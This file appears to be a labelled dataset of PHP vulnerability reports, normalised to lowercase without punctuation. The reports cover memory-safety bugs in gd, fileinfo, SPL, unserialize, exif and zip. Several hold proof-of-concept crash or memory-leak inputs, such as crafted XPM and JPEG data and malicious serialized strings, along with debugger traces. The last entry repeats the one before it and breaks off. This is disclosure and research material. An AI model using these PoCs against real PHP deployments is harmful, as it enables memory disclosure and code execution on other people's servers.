at home/kuba/php/php-src/zend/zend.c:953 17 in php_request_shutdown dummy at home/kuba/php/php-src/main/main.c:1807 18 in do_cli argc=2 argv at home/kuba/php/php-src/sapi/cli/php_cli.c:1177 19 in main argc=2 argv at home/kuba/php/php-src/sapi/cli/php_cli.c:1378	11
php-gd c_color null pointer dereference php-gd v5.4.17-2 c_color null pointer dereference so the bug is triggered in gdimagecreatefromxpm on line 42 of gd/libgd/gdxpm.c gdimageptr gdimagecreatefromxpm char filename xpminfo info xpmimage image int i j k number char buf 5 gdimageptr im 0 int pointer int red 0 green 0 blue 0 int colors int ret ret xpmreadfiletoxpmimage filename image info if ret xpmsuccess return 0 if im gdimagecreate image.width image.height goto done number image.ncolors colors int safe_emalloc number sizeof int 0 for i 0 i number i switch strlen image.colortable i c_color boom the call to strlen parses image.colortable i c_color which is initialised as null if the particular color mapping uses a different key such as monochrome/monovisual the xpmcolorkeys array stores all avaliable keys and can be found in libxpm const char xpmcolorkeys s key 1 symbol m key 2 mono visual g4 key 3 4 grays visual g key 4 gray visual c key 5 color visual the following xpm file will trigger the bug xpm static char gv_xpm 13 13 6 1 a c ffffff 0 b c cccccc 0.0399 c c 999999 0.0798 d m 666666 0.12 note this is monochrome/monovisual e c 333333 0.16 f c 000000 0.2 x-axis 0 40 80 120 160 200 240 280 320 360 400 440 480 y-axis 0 40 80 120 160 200 240 280 320 360 400 440 480 feddddcccccba fedddccccbbab poc php imagecreatefromxpm monochome-poc.xpm gdb p colortable 0 2 string a symbolic m_color g4_color g_color c_color ffffff gdb p colortable 1 3 string b symbolic m_color g4_color g_color c_color cccccc gdb p colortable 2 4 string c symbolic m_color g4_color g_color c_color 999999 gdb p colortable 3 5 string d symbolic m_color 666666 g4_color g_color c_color gdb p colortable 4 6 string e symbolic m_color g4_color g_color c_color 333333 gdb p colortable 5 7 string f symbolic m_color g4_color g_color c_color 000000 gdb c continuing program received signal sigsegv segmentation fault strlen_sse2_pminub at sysdeps/x86_64/multiarch/strlen-sse2-pminub.s:39 39 movdqu rdi xmm1 gdb bt 0 strlen_sse2_pminub at sysdeps/x86_64/multiarch/strlen-sse2-pminub.s:39 1 in gdimagecreatefromxpm filename optimized out at usr/src/debug/php-5.4.17/ext/gd/libgd/gdxpm.c:42 2 in php_image_create_from ht optimized out return_value image_type=6 tn xpm func_p gdimagecreatefromxpm ioctx_func_p optimized out return_value_used optimized out this_ptr optimized out return_value_ptr optimized out at usr/src/debug/php-5.4.17/ext/gd/gd.c:2534 3 in zend_do_fcall_common_helper_spec execute_data at usr/src/debug/php-5.4.17/zend/zend_vm_execute.h:643 4 in execute op_array at usr/src/debug/php-5.4.17/zend/zend_vm_execute.h:410 5 in zend_eval_stringl str=str entry imagecreatefromxpm 0day/zero-day2.xpm n str_len=str_len entry=42 retval_ptr=retval_ptr entry string_name=string_name entry php shell code at usr/src/debug/php-5.4.17/zend/zend_execute_api.c:1197 6 in readline_shell_run at usr/src/debug/php-5.4.17/ext/readline/readline_cli.c:664 7 in do_cli argc=2 argv at usr/src/debug/php-5.4.17/sapi/cli/php_cli.c:986 8 in main argc=2 argv at usr/src/debug/php-5.4.17/sapi/cli/php_cli.c:1364 test script xpm static char gv_xpm 13 13 6 1 a c ffffff 0 b c cccccc 0.0399 c c 999999 0.0798 d m 666666 0.12 note this is monochrome/monovisual e c 333333 0.16 f c 000000 0.2 x-axis 0 40 80 120 160 200 240 280 320 360 400 440 480 y-axis 0 40 80 120 160 200 240 280 320 360 400 440 480 feddddcccccba fedddccccbbab expected result php print imagecreatefromxpm monochome-poc.xpm n resource id 4 php actual result php print imagecreatefromxpm monochome-poc.xpm n segmentation fault core dumped	11
fileinfo mconvert incorrect handling of truncated pascal string size a flaw was found in the way file compute the truncated pascal string size in mconvert function upstream commit acknowledgment this issue was discovered by francisco alonso of the red hat security response team	11
fileinfo cdf_check_stream_offset insufficient boundary check a flaw was found in the way file uses cdf_check_stream_offset function when checks stream offsets for certain composite document format cdf this issue was discovered by francisco alonso of the red hat security response team	11
fileinfo cdf_count_chain insufficient boundary check a flaw was found in the way file uses cdf_count_chain function to processes maxsector for certain composite document format cdf files this issue was discovered by francisco alonso of the red hat security response team	9
fileinfo cdf_read_property_info insufficient boundary check a flaw was found in the way file uses cdf_read_property_info function when checks stream offsets for certain composite document format cdf this issue was discovered by francisco alonso of the red hat security response team	7
unserialize spl arrayobject splobjectstorage type confusion betreff unserialize spl arrayobject splobjectstorage type confusion remote code execution vulnerability datum fri 20 jun 2014 23:06:40 0200 von stefan esser ontheroad nopiracy.de an security php.net hey i have found two more type confusion vulnerabilities in php this time i had a look into the spl extension and the unserialize handlers of it s objects the arrayobject and also the splobjectstorage unserialize handler contain a similar code snippet that does not verify the type of unserialized data before using it let s have a look at the code from ext/spl/spl_observer.c when you look into spl_method splobjectstorage unserialize you can find the following code at the end of the function alloc_init_zval pmembers if php_var_unserialize pmembers p s buf_len var_hash tsrmls_cc zval_ptr_dtor pmembers goto outexcept copy members if intern std.properties rebuild_object_properties intern std zend_hash_copy intern std.properties z_arrval_p pmembers copy_ctor_func_t zval_add_ref void null sizeof zval zval_ptr_dtor pmembers the problem here is the pmembers is trusted to be an array after unserialization however a malicious attacker can make it whatever he wants it to be which might lead to a simple crash or arbitrary code execution if pmembers is for example an integer the integer value will be used as a pointer to a hashtable in memory if an attacker knows the address of any hashtable in memory real or fake he can cause trouble however the attack is a lot easier if the attacker uses a string instead because he can make the string look like a fake hashtable and then let it be used a fake hashtable will then be copied into the properties and on destruction the attacker supplied destructor of the fake hashtable is executed this allows arbitrary code execution i have attached two example exploits for the two separate vulnerabilities in arrayobject and splobjectstorage they try to exploit the vulnerability locally with some heap spraying as you can see from the output i control the program counter and because this is a destructor of our fake hashtable i also control the memory rdi points to lldb php-5.5.13/sapi/cli/php unserialize_arrayobject_exploit.php current executable set to php-5.5.13/sapi/cli/php x86_64 lldb run process 86493 launched users/sesser/desktop/php/php-5.5.13/sapi/cli/php x86_64 setting up memory now performing exploit process 86493 stopped thread 1 tid queue com.apple.main-thread stop reason exc_bad_access code=1 address frame 0 error memory read failed for lldb re re pc rip lldb x/20 rdi lldb unlike the previous vulnerability in phpinfo that i reported last week btw i still have n't received some ack about it this two vulnerabilities are exposed through unserialize to user input quite often and yes we all know that unserialize should not be exposed to user input because of object injection but many projects still do it most of the time they think they are safe because they do not expose any objects themselves and only use unserialize for data exchange these vulnerabilities however are a reminder how dangerous this is regards stefan esser	11
segfault in cdf.c during test patch for cve-2012-1571 we discover another possible segfault in cd.c we have a 32bits pointer overflow	11
segfault in dns_get_record testing patch for cve-2014-4049 we discover some other possible buffer overflow code rely on dlen from server response without overflow check code call dn_expand without sending real end of answer	11
addresssanitizer reports a global buffer overflow in mkgmtime function please note that i can not reproduce it without addresssanitizer enabled addresssanitizer global-buffer-overflow on address	11
integer overflow in unserialize 32-bits only warning class php_incomplete_class has no unserializer in home/user/desktop/poc.php on line 2 program received signal sigsegv segmentation fault as expected p pointer now points to invalid memory address and continuing the execution we are going to dereference this address and eventually crash gdb c continuing program received signal sigsegv segmentation fault datalen is calculated correctly and as 140739386706923 is greater than max 140737239223281 we jump into the if statement and get this insufficient data for unserializing 2147483643 required 1 present in	11
heap corruption in exif_thumbnail report by otto ebeling hi i鹿d like to report a bug that causes heap corruption when parsing the thumbnail of a specially crafted jpg image could you confirm that you can repro and provide an estimated timeline for releasing the fix so we can coordinate this with the hhvm team as hhvm contains the affected code as well details php provides apis such as exif_thumbnail that can be used to extract embedded thumbnails from various image formats in the process of extracting a tiff-formatted exif thumbnail from a jpeg image php re-encodes most ifd tags present in the thumbnail directory and prepends them to the thumbnail image in order to produce a standalone tiff file individual values are re-encoded using the exif_ifd_make_value function if this function is asked to write out an array of floating point values single or double precision it erroneously uses the size of the whole array when copying individual elements using memmove leading to heap corruption see l2447 byte_count is the length of the entire array as calculated at l2390 in addition to this the from pointer of the memmove calls point to the pointer to the array not its contents instead of info_data value.f the code should be using info_value f to exploit a target application that uses this api or exif_read_data with suitable parameters a malicious user can trigger this condition by supplying a tag that contains an array of floating-point values and futher tags that indicate the presence of a tiff thumbnail the image itself need not be valid as long as the exif_ifd_make_value gets invoked example jpg file xxd format that causes a sigsegv on php 5.6.0 0000000 ffd8 ffe1 0050 4578 6966 0000 4949 2a00 pexif ii 0000010 1500 0000 ff00 0020 0000 00ff ffff ffff 0000020 1100 001d 0000 0000 0003 001a 010c 0024 0000030 0000 0017 0000 0001 0204 0001 0000 0040 0000040 0000 0017 0104 0001 0000 0001 0000 0000 0000050 0000 0000 0000 0000 0000 0000 0000 0000 0000060 0000 0000 0000 0000 0000 0000 0000 0000 0000070 0000 0000 0000 0000 0000 0000 0000 0000 0000080 0000 0000 0000 0000 0000 0000 0000 0000 0000090 0000 0000 0000 0000 0000 0000 0000 0000 00000a0 0000 0000 0000 0000 0000 0000 0000 0000 00000b0 0000 0000 0000 0000 0000 0000 0000 0000 00000c0 0000 0000 0000 0000 0000 0000 0000 0000 00000d0 0000 0000 0000 0000 0000 0000 0000 0000 00000e0 0000 0000 0000 0000 0000 0000 0000 0000 00000f0 0000 0000 0000 0000 0000 0000 0000 0000 0000100 0000 0000 0000 0000 0000 0000 0000 0000 0000110 0000 0000 0000 0000 0000 0000 0000 0000 0000120 0000 0000 0000 0000 0000 0000 0000 0000 0000130 0000 0000 0000 0000 0000 0000 0000 0000 0000140 0000 0000 0000 0000 0000 0000 0000 0000 0000150 0000 0000 0000 0000 0000 0000 0000 0000 0000160 0000 0000 0000 0000 0000 0000 0000 0000 script php exif_thumbnail corrupt_heap.jpg regards otto ebeling facebook security infrastructure	11
fileinfo out-of-bounds read in elf note headers an out-of-bounds read flaw was found in file s donote function in the way the file utility determined the note headers of a elf file this could possibly lead to file executable crash this issue was discovered by francisco alonso of the red hat product security	7
heap-based buffer overflow in dns txt record parsing stefan esser pointed out that the following commit fixes a heap-based buffer overflow in dns txt record parsing a malicious server or man-in-the-middle attacker could possibly use this flaw to execute arbitrary code as the php interpreter if a php application uses dns_get_record to perform a dns query	11
spl iterators use-after-free spl provides a set of iterators to traverse over objects including internal iterators changes in the object are not projected to the object iterators this results in iterators pointing to freed memory calling next on the iterator triggers use-after-free please use cve-2014-4670 for this bug test script php list new spldoublylinkedlist list push a list push b list rewind list offsetunset 0 list push c list offsetunset 0 list next actual result use_zend_alloc=0 valgrind opt/php/5.5.14/bin/php test.php 14274 memcheck a memory error detector 14274 copyright c 2002-2011 and gnu gpl d by julian seward et al 14274 using valgrind-3.7.0 and libvex rerun with h for copyright info 14274 command opt/php/5.5.14/bin/php test.php 14274 14274 invalid read of size 4 14274 at spl_dllist_it_helper_move_forward spl_dllist.c:989 14274 by zend_do_fcall_common_helper_spec zend_vm_execute.h:550 14274 by execute_ex zend_vm_execute.h:363 14274 by zend_execute_scripts zend.c:1316 14274 by php_execute_script main.c:2506 14274 by do_cli php_cli.c:994 14274 by main php_cli.c:1378 14274 address is 8 bytes inside a block of size 16 free d 14274 at free vg_replace_malloc.c:427 14274 by zim_spl_spldoublylinkedlist_offsetunset spl_dllist.c:922 14274 by zend_do_fcall_common_helper_spec zend_vm_execute.h:550 14274 by execute_ex zend_vm_execute.h:363 14274 by zend_execute_scripts zend.c:1316 14274 by php_execute_script main.c:2506 14274 by do_cli php_cli.c:994 14274 by main php_cli.c:1378	11
arrayiterator use-after-free due to object change during sorting arrayiterator should not be changed while being sorted there is a check missing in unserialize method in spl_array.c test script php it new arrayiterator array_fill 0,10 x 1 function badsort a b globals it unserialize globals it serialize return true it uksort badsort expected result warning modification of arrayobject during sorting is prohibited in spl_array.php on line 5 actual result use_zend_alloc=0 valgrind opt/php/5.5.14/bin/php spl_array.php 23209 memcheck a memory error detector 23209 copyright c 2002-2011 and gnu gpl d by julian seward et al 23209 using valgrind-3.7.0 and libvex rerun with h for copyright info 23209 command opt/php/5.5.14/bin/php spl_array.php 23209 23209 invalid read of size 4 23209 at php_array_user_key_compare array.c:736 23209 by zend_qsort_r zend_qsort.c:84 23209 by zend_qsort zend_qsort.c:123 23209 by zend_hash_sort zend_hash.c:1463 23209 by zif_uksort array.c:796 23209 by zend_call_function zend_execute_api.c:955 23209 by 23209 address is 4 bytes inside a block of size 36 free d 23209 at free vg_replace_malloc.c:427 23209 by zend_hash_destroy zend_hash.c:565 23209 by zval_dtor_func zend_variables.c:45 23209 by zval_ptr_dtor zend_variables.h:35 23209 by zim_spl_array_unserialize spl_array.c:1781 23209 by zend_do_fcall_common_helper_spec zend_vm_execute.h:550 23209 by execute_ex zend_vm_execute.h:363 23209 by zend_call_function zend_execute_api.c:937 23209 by php_array_user_key_compare array.c:757 23209 by zend_qsort_r zend_qsort.c:84 23209 by zend_qsort zend_qsort.c:123 23209 by zend_hash_sort zend_hash.c:1463	11
phpinfo type confusion information leak vulnerability i recently discovered an easy to exploit arbitrary information leak vulnerability in php the information leak can be exploited by setting php_self php_auth_type php_auth_user or php_auth_pw to non-string variables before calling phpinfo when you look at the code from ext/standard/info.c you will see that the code simply trusts that the returned zvals are of type string if there are however integers the code will interpret the integer as a in memory pointer and print out the binary string at that position because this is only exploitable in case these variables are overwritten as integers which is less likely in a remote context this has to be mostly considered a local information leak only however if you are running as mod_php and there is mod_ssl this could be used to steal the private ssl key from memory if you can inject php code regards stefan esser	9
cve-2014-5120 null byte injection possible with imagexxx functions the paths passed to the imagepng imagejpeg imagegif imagewebp and imagewbmp functions are not validated to not contain null bytes and as such may allow paths to be prematurely terminated by an attacker this could be used to overwrite a file in a location other than the intended destination the attached patch will check for null bytes in the given path and return false raising a warning in the event a null byte is encountered	6
use after free vulnerability in unserialize reported by stefan esser stefan.esser sektioneins.de a while ago the function process_nested_data was changed to better handle object properties before it was possible to create numeric object properties which would cause trouble down the road so the following code was added if objprops else object properties should include no integers convert_to_string key zend_hash_update ht z_strval_p key z_strlen_p key 1 data sizeof data null whoever wrote this code did not know about the history of the unserialize function and that in earlier times 2004 i found a use after free vulnerability in it a non detailed write up can be found in bug 7 the problem with the above code is that when there are two identical keys in the object s serialized properties the second key will delete the first one from memory and destroy the zval associated with it this means that zval and all its children is freed from memory however the unserialize code will still allow to use r or r to set references to that already freed memory it has been demonstrated many times before that use after free inside unserialize allows an attacker to execute arbitrary code also some programs do not only unserialize user input but they also sent a serialized reply back to the caller in such a setup an attacker can not only trigger code execution but also leak memory content from remote this together means he can write a fully working remote exploit that bypasses all modern mitigations examples how that was possible before you can see from this slide deck starting from slide 30 last time i checked one prominent example of php code that uses unserialize and serialize in this way is sugarcrm the following code shows the leak php data o:8 stdclass 3 s:3 aaa a:5 i:0 i:1 i:1 i:2 i:2 s:39 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa i:3 i:4 i:4 i:5 s:3 aaa i:1 s:3 ccc r:5 x unserialize data var_dump x php test.php object stdclass 1 2 aaa int 1 ccc string 39 1y and the following code should crash php php for i=4 i 100 i var_dump i m new stdclass u array 1 m aaa array 1,2 u,4,5 m bbb 1 m ccc u m ddd str_repeat a i z serialize m z str_replace bbb aaa z var_dump z y unserialize z var_dump y as you can see here php x.php int 4 string 134 o:8 stdclass 4 s:3 aaa a:5 i:0 i:1 i:1 i:2 i:2 a:1 i:0 i:1 i:3 i:4 i:4 i:5 s:3 aaa i:1 s:3 ccc r:5 s:3 ddd s:4 aaaa object stdclass 2 3 aaa int 1 ccc null ddd string 4 aaaa int 5 string 135 o:8 stdclass 4 s:3 aaa a:5 i:0 i:1 i:1 i:2 i:2 a:1 i:0 i:1 i:3 i:4 i:4 i:5 s:3 aaa i:1 s:3 ccc r:5 s:3 ddd s:5 aaaaa object stdclass 1 3 aaa int 1 ccc null ddd string 5 aaaaa int 6 string 136 o:8 stdclass 4 s:3 aaa a:5 i:0 i:1 i:1 i:2 i:2 a:1 i:0 i:1 i:3 i:4 i:4 i:5 s:3 aaa i:1 s:3 ccc r:5 s:3 ddd s:6 aaaaaa segmentation fault 11 somewhen before you fix and release this i will prepare a poc that demonstrates full control over the program counter and to leak specific stuff from the system	11
xmlrpc_set_type segfaults with valid iso8601 date string php crashes when trying to call xmlrpc_set_type with a correctly formatted iso8601 datetime string from the date function note that if you specify a datetime string without the 00:00 it will work if you specify the timezome information as the constant date_iso8601 does php will crash reproduce code this code breaks d date date_iso8601 xmlrpc_set_type d datetime echo xmlrpc_encode_request method.call array date d working code d 2008-01-01 20:00:00 xmlrpc_set_type d datetime echo xmlrpc_encode_request method.call array date d expected result methodcall methodname method.call methodname params param value struct member name date name value datetime.iso8601 20080101t20:00:00 datetime.iso8601 value member struct value param params methodcall actual result stack smashing detected php terminated aborted core dumped	11
explicit double free hi in zend/zend_ts_hash.c 142 tsrm_mutex_free ht mx_reader 143 tsrm_mutex_free ht mx_reader this is a double free probably a merge mistake i ll check it out	11
invalid free hi in ext/fileinfo/libmagic/apprentice.c an invalid free occurs 1173 char mfn maxpathlen 1198 efree mfn as an array is not heap allocated it can not be freed	11
out of bounds read crashes php-cgi i cloned the php git repo on 12/16/2014 and built from source using the afl-gcc compiler cc=/path/to/afl-gcc configure afl_harden=1 make php 7.0.0-dev cgi-fcgi built dec 16 2014 14:07:45 copyright c 1997-2014 the php group zend engine v3.0.0-dev copyright c 1998-2014 zend technologies while fuzzing the php-cgi binary i found that a one byte file containing and no newline causes php-cgi to segfault printf crashme.php php-cgi crashme.php segmentation fault i talked with the author of afl-fuzz to make sure there was n't some pointer weirdness happening as a result of compiling this with afl-gcc and he says it looks like an out of bounds read probably not exploitable but might could disclose server memory but anyone that can upload php scripts can do far worse i have not tried exploiting this via a browser with xss or anything fancy yet just passing this via the command line in a debian vm i can provide a core dump or any other information that is needed expected result php-cgi should fail gracefully not segfault actual result 61759 invalid read of size 1 61759 at main cgi_main.c:2460 61759 address is not stack d malloc d or recently free d 61759 61759 61759 process terminating with default action of signal 11 sigsegv 61759 access not within mapped region at address 61759 at main cgi_main.c:2460 61759 if you believe this happened as a result of a stack 61759 overflow in your program s main thread unlikely but 61759 possible you can try to increase the size of the 61759 main thread stack using the main-stacksize flag 61759 the main thread stack size used in this run was 8388608 segmentation fault	11
fileinfo out-of-bounds memory access the bug reported here pulls through all the php versions and can cause out-of-bounds read access in libmagic 5.21 i m going to prepare a patch and suitable test see also the related security item in	7
heap buffer overflow in enchant_broker_request_dict the following test case crashes php as it tries to read invalid memory the write heap overflow from asan is not always reproducible you need to run the test case a couple of times to get it affects also 64-bit systems poc php tag en_us r enchant_broker_init d enchant_broker_request_dict r tag enchant_dict_quick_check d one suggs d enchant_broker_request_dict r tag enchant_dict_quick_check d one suggs d enchant_broker_request_dict r tag result fri dec 5 13:32:59 2014 script home/symeon/desktop/dict.php home/symeon/desktop/php-5.6.3/ext/enchant/enchant.c 554 block status beginning ok allocated on home/symeon/desktop/php-5.6.3/ext/enchant/enchant.c:554 4 bytes start ok end overflown magic instead of at least 4 bytes overflown 4350 error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 4 at thread t0 0 in zif_enchant_broker_request_dict home/symeon/desktop/php-5.6.3/ext/enchant/enchant.c:571 1 in zend_do_fcall_common_helper_spec home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:558 2 in zend_do_fcall_spec_const_handler home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:2595 3 in execute_ex home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:363 4 in zend_execute home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:388 5 in zend_execute_scripts home/symeon/desktop/php-5.6.3/zend/zend.c:1344 6 in php_execute_script home/symeon/desktop/php-5.6.3/main/main.c:2584 7 in do_cli home/symeon/desktop/php-5.6.3/sapi/cli/php_cli.c:994 8 in main home/symeon/desktop/php-5.6.3/sapi/cli/php_cli.c:1378 9 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 10 in start is located 248 bytes to the right of 0-byte region 4350 addresssanitizer check failed src/libsanitizer/asan/asan_allocator2.cc:216 id 0 0 in zdapvrkst9nothrow_t 1 in zn11__sanitizer11checkfailedepkcis1_yy 2 in 0 3 in asan_unpoison_stack_memory 4 in asan_report_error 5 in asan_report_store4 6 in zif_enchant_broker_request_dict home/symeon/desktop/php-5.6.3/ext/enchant/enchant.c:571 7 in zend_do_fcall_common_helper_spec home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:558 8 in zend_do_fcall_spec_const_handler home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:2595 9 in execute_ex home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:363 10 in zend_execute home/symeon/desktop/php-5.6.3/zend/zend_vm_execute.h:388 11 in zend_execute_scripts home/symeon/desktop/php-5.6.3/zend/zend.c:1344 12 in php_execute_script home/symeon/desktop/php-5.6.3/main/main.c:2584 13 in do_cli home/symeon/desktop/php-5.6.3/sapi/cli/php_cli.c:994 14 in main home/symeon/desktop/php-5.6.3/sapi/cli/php_cli.c:1378 15 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 regards s paraschoudis	11
buffer read overflow in gd_gif_in.c an asan'ified call looks like this giftogd2 asan_stack-oob_53533d_34_adaf0da1764aafb7039440dbe098569b.gif tmp/null 1 1 23529==error addresssanitizer stack-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in getcode libgd-2.1.0_master/master/src/gd_gif_in.c:471 1 in getcode libgd-2.1.0_master/master/src/gd_gif_in.c:484 2 in lwzreadbyte libgd-2.1.0_master/master/src/gd_gif_in.c:538 3 in lwzreadbyte libgd-2.1.0_master/master/src/gd_gif_in.c:627 4 in readimage libgd-2.1.0_master/master/src/gd_gif_in.c:677 5 in gdimagecreatefromgifctx libgd-2.1.0_master/master/src/gd_gif_in.c:311 6 in gdimagecreatefromgif libgd-2.1.0_master/master/src/gd_gif_in.c:154 7 in main libgd-2.1.0_master/master/src/giftogd2.c:32 8 lib/x86_64-linux-gnu/libc.so.6 9 in start libgd-2.1.0_master/master/f_app_src/giftogd2 address is located in stack of thread t0 at offset 66744 in frame 0 in readimage libgd-2.1.0_master/master/src/gd_gif_in.c:638 this frame has 14 object s 32 40 96 104 160 164 224 228 288 296 352 356 416 424 480 481 c 544 548 xpos 608 612 ypos 672 676 pass 736 740 v 800 804 i 864 66744 sd memory access at offset 66744 overflows this variable summary addresssanitizer stack-buffer-overflow libgd-2.1.0_master/master/src/gd_gif_in.c:471 getcode shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f4 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 23529==aborting	11
use after free vulnerability in php s unserialize still exploitable reported by stefan.esser sektioneins.de hi today i wanted to write a write up of the use after free vulnerability in unserialize that was fixed last month remember i reported it on 2nd december sent in a patch on 10th december because julien pauli asked for one you later released updates unfortunately around that time i was too busy to actually look into what you released and in a way i thought it would be not necessary because i sent in the correct patch however today i see that you changed my patch instead of using my correct patch you applied the following wrong patch else object properties should include no integers convert_to_string key if zend_symtable_find ht z_strval_p key z_strlen_p key 1 void old_data success var_push_dtor var_hash old_data zend_hash_update ht z_strval_p key z_strlen_p key 1 data sizeof data null there is a small but important difference to the patch i sent on 10th december you use zend_symtable_find instead of zend_hash_find from my patch because of this change the fix is incomplete it now detects attacks that try to replace a key like aaa but it does not fix attacks where the key is a numerical string like 123 the reason for this is that we do not want integer keys in objects that is why the code was added in the first place the object properties are therefore inserted via zend_hash_update instead of zend_symtable_update therefore something like 123 will be inserted as a string and not as a numerical 123 on the attempt to do the overwrite attack you now check with zend_symtable_find this function will turn the 123 into a numerical 123 and therefore not see that it is already there the protection will not be executed and therefore the attack works in the same way as before here is the updated diff that shows how the code is still vulnerable to a slightly modified form of the attack test bug xxxxx use after free vulnerability in unserialize bypassing the cve-2014-8142 fix file php for i=4 i 100 i m new stdclass u array 1 m aaa array 1,2 u,4,5 m bbb 1 m ccc u m ddd str_repeat a i z serialize m z str_replace aaa 123 z z str_replace bbb 123 z y unserialize z z serialize y done expectf done please advice me of the new cve for the previously incorrectly fixed problem and a proposed timeframe for disclosure ps i also advice educating the redhat people who get this information forwarded so that they understand the seriousness of remote code execution in unserialize just because the manual says bad idea does not make it go away wordpress does still in 2015 unserialize data they pull over the network from their server okay if possible they use ssl for that but we know for 1-2 years now that there are a bunch of attackers capable of doing ssl mitm in the wild nation state or just another broken in-ca and wordpress is just one of so many examples especially if you go away from opensource code and look at all the self-made websites/self-made cmses that we see when auditing real world code kind regards and a productive 2015 stefan esser	11
free called on unitialized pointer this bug was found with american fuzzy lop thanks lcamtuf my environment is debian wheezy both 32 and 64-bit variants php was build from source not pulled from package repos built with configure enable-exif program received signal sigsegv segmentation fault this vulnerability will cause the following struct to be allocated however the field value is never set it will contain the value of whatever memory was previously in its place php will then bail on this jpeg causing a call to zend_mm_free_int over this unassigned pointer the important variable here is byte_count i have triggered the bug in 32-bit and 64-bit debian when building from source i have put some effort into triggering the bug with php5-cli from the debian wheezy packages for some reason i have not been able to trigger the bug using debian stable packages i have been able to gain limited control of the crash in 64-bit debian when building from source with a fresh build of php-5.4.36 in 64-bit debian wheezy control of the register being dereferenced can be achieved this is a bit tempermental and you may have to play around with it when freed at exif.c:3846 if xp_field_type.value is null no call to free is made	11
use after free vulnerability in unserialize with datetimezone i use after free vulnerability static int php_date_timezone_initialize_from_hash zval return_value php_timezone_obj tzobj hashtable myht tsrmls_dc zval z_timezone null zval z_timezone_type null if zend_hash_find myht timezone_type 14 void z_timezone_type success if zend_hash_find myht timezone 9 void z_timezone success convert_to_long z_timezone_type if success timezone_initialize tzobj z_strval_pp z_timezone tsrmls_cc return success return failure the convert_to_long leads to the zval and all its children is freed from memory however the unserialize code will still allow to use r or r to set references to that already freed memory there is a use after free vulnerability and allows to execute arbitrary code the following code should leak arbitrary memory php fakezval pack iiii data unserialize a:2 i:0 o:12 datetimezone 2 s:13 timezone_type a:2 i:0 i:1 i:1 i:2 s:8 timezone s:1 a i:1 r:4 for i 0 i 5 i v i fakezval i var_dump data ii type confusion vulnerability z_strval_pp leads to various problems the following code should crash php php data unserialize o:12 datetimezone 2 s:13 timezone_type i:1 s:8 timezone i:1	11
use-after-free hi in ext/opcache/zend_shared_alloc.c there is a use-after-free 347 if free_source 348 efree source 349 350 zend_shared_alloc_register_xlat_entry source retval thanks	11
null pointer dereference hi in ext/pgsql/pgsql.c 6447 token php_strtok_r table_copy tmp 6448 len strlen token token may return null leading to a null pointer deference elsewhere the result of php_strtok_r is checked against null and should be here too a quick look shows that this may be reproducable by running pg_insert with a null table-name	11
zip integer overflow leads to writing past heap boundary php 5.6.6 has a integer overflow vulnerability when opening a ziparchive with a large number of entries this results in writing pass the heap boundary and crashing php configuration configure enable-zip test script php path argv 1 zip new ziparchive if zip open path true echo open zip close actual result technical details php testzip.php fuzz.zip program received signal sigsegv segmentation fault registers eax ebx ecx edx esi 0 edi ebp esp eip zip_cdir_new+219 add dword ptr ebp eflags carry parity adjust zero sign trap interrupt direction overflow code zip_entry_init+12 mov eax dword ptr ebp zip_entry_init+15 mov dword ptr eax zip_entry_init+22 mov eax dword ptr ebp zip_entry_init+25 mov dword ptr eax zip_entry_init+32 mov eax dword ptr ebp zip_entry_init+35 mov dword ptr eax zip_entry_init+42 pop ebp gdb-peda info proc mappings process 15992 mapped address spaces start addr end addr size offset objfile root/php-5.6.6/sapi/cli/php root/php-5.6.6/sapi/cli/php root/php-5.6.6/sapi/cli/php heap overflow heap the vulnerability is in zip_dirent.c:113 else if cd entry struct zip_entry malloc sizeof cd entry size_t nentry null whereby sizeof cd entry nentry results in an integer overflow the crash will be trigger later on when writing past the heap boundary 1 in zip_cdir_new nentry error at root/php-5.6.6/ext/zip/lib/zip_dirent.c:120 120 zip_entry_init cd entry+i	11
zip integer overflow leads to writing past heap boundary php 5.6.6 has a integer overflow vulnerability when opening a ziparchive with a large number of entries this results in writing pass the heap boundary and crashing php configuration configure enable-zip test script php path argv 1 zip new ziparchive if zip open path true echo open zip close actual result technical details php testzip.php fuzz.zip program received signal sigsegv segmentation fault registers eax ebx ecx edx esi 0 edi ebp esp eip zip_cdir_new+219 add dword ptr ebp eflags carry parity adjust zero sign trap interrupt direction overflow code zip_entry_init+12 mov eax dword ptr ebp zip_entry_init+15 mov dword ptr eax zip_entry_init+22 mov eax dword ptr ebp zip_entry_init+25 mov dword ptr eax zip_entry_init+32 mov eax dword ptr ebp zip_entry_init+35 mov dword ptr eax zip_entry_init+42 pop ebp gdb-peda info proc mappings process 15992 mapped address spaces start addr end addr size offset objfile root/php-5.6.6/sapi/cli/php root/php-5.6.6/sapi/cli/php root/php-5.6.6/sapi/cli/php heap overflow heap the vulnerability is in zip_dirent.c:113 else if cd entry struct zip_entry malloc sizeof cd entry size_t nentry null whereby sizeof cd entry nentry results in an integer overflow the crash will be trigger later on when writing past the heap boundary 1 in 